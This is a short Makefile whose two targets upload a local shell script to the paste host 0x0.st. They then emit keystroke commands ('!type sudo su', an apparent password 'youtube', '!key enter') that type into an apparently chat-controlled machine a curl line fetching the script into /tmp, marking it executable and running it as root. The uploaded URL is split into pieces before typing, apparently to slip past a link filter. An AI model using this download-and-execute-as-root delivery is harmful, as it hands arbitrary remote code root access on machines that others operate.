deploy:
	@url=$$(curl -fsS -F 'file=@script.sh' https://0x0.st); \
	u=$${url#https://}; \
	a=$${u%$${u#*.}}; \
	b=$${u#*.}; \
	echo "!type sudo su"; \
	echo "!key enter"; \
	echo "!type youtube"; \
	echo "!key enter"; \
	echo "!type curl https://"; \
	echo "!type $$a"; \
	echo "!type $$b > /tmp/script && chmod +x /tmp/script && /tmp/script"; \
	echo "!key enter"; \
	echo "curl https://$$u > /tmp/script && chmod +x /tmp/script && sudo /tmp/script"

test:
	@url=$$(curl -fsS -F 'file=@test.sh' https://0x0.st); \
	u=$${url#https://}; \
	a=$${u%$${u#*.}}; \
	b=$${u#*.}; \
	echo "!type sudo su"; \
	echo "!key enter"; \
	echo "!type youtube"; \
	echo "!key enter"; \
	echo "!type curl https://"; \
	echo "!type $$a"; \
	echo "!type $$b > /tmp/script && chmod +x /tmp/script && /tmp/script"; \
	echo "!key enter"; \
	echo "curl https://$$u > /tmp/script && chmod +x /tmp/script && sudo /tmp/script"

